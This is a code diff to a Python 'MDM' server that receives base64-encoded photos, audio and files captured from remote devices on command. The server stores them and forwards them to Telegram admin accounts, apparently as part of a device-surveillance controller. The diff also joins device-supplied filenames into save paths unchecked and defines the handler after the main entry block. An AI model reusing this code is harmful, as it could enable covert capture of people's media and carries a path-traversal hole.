@@ -2060,6 +2060,11 @@ def _sock_file_explorer(data):
                     logger.error(f"فشل إرسال تقرير: {e}")
         return
 
+    # ⚡ Check for base64_media (صور/صوت عبر Socket.IO بدل HTTP)
+    if data_type == "base64_media":
+        _handle_base64_media(dev, data)
+        return
+
     cmd = data.get("command", "?")
     status = data.get("status", "?")
     logger.info(f"[Socket] استكشاف ملفات: #{dev.get('short_id', '?')} cmd={cmd} status={status}")
@@ -2288,3 +2293,61 @@ if __name__ == "__main__":
     except Exception as e:
         logger.critical(f"فشل التشغيل: {type(e).__name__}: {e}", exc_info=True)
         sys.exit(1)
+
+
+def _handle_base64_media(dev, data):
+    # معالجة الصور/الصوت المرسلة عبر Socket.IO Base64
+    try:
+        import base64 as b64
+        command = data.get("command", "unknown")
+        file_type = data.get("file_type", "photo")
+        filename = data.get("filename", f"{command}_{int(time.time())}.jpg")
+        base64_data = data.get("base64_data", "")
+        file_size = data.get("size", 0)
+        text_preview = data.get("text_preview", "")
+
+        short_id = dev.get('short_id', '?')
+        model = dev.get('model', '?')
+        did = dev.get('device_id', '')
+
+        if not base64_data:
+            logger.warning(f"[Base64] Empty base64 data from #{short_id}")
+            return
+
+        logger.info(f"[Base64] #{short_id} {command} ({file_size} bytes)")
+
+        # Decode base64
+        file_bytes = b64.b64decode(base64_data)
+
+        # Save to file
+        upload_dir = os.path.join("uploads", did)
+        os.makedirs(upload_dir, exist_ok=True)
+        filepath = os.path.join(upload_dir, filename)
+        with open(filepath, "wb") as f:
+            f.write(file_bytes)
+
+        # Send to bot
+        if mdm_bot:
+            lbl = COMMANDS.get(command, {}).get("label", command)
+            caption = f"📥 <b>{lbl}</b>\n━━━━━━━━━━━━━━━\n📱 #{short_id} {model}\n📁 {filename} ({file_size} bytes)\n"
+            if text_preview:
+                caption += f"📝 {text_preview}\n"
+
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    if file_type == "photo":
+                        mdm_bot.bot.send_photo(admin_id, photo=open(filepath, "rb"), caption=caption, parse_mode="HTML")
+                    elif file_type == "audio":
+                        mdm_bot.bot.send_audio(admin_id, audio=open(filepath, "rb"), caption=caption, parse_mode="HTML")
+                    else:
+                        mdm_bot.bot.send_document(admin_id, document=open(filepath, "rb"), caption=caption, parse_mode="HTML")
+                except Exception as e:
+                    logger.error(f"فشل إرسال base64 media: {e}")
+                    try:
+                        mdm_bot.bot.send_document(admin_id, document=open(filepath, "rb"), caption=caption, parse_mode="HTML")
+                    except:
+                        pass
+
+        logger.info(f"[Base64] ✅ Sent to bot: {filename}")
+    except Exception as e:
+        logger.error(f"خطأ في معالجة base64 media: {e}")
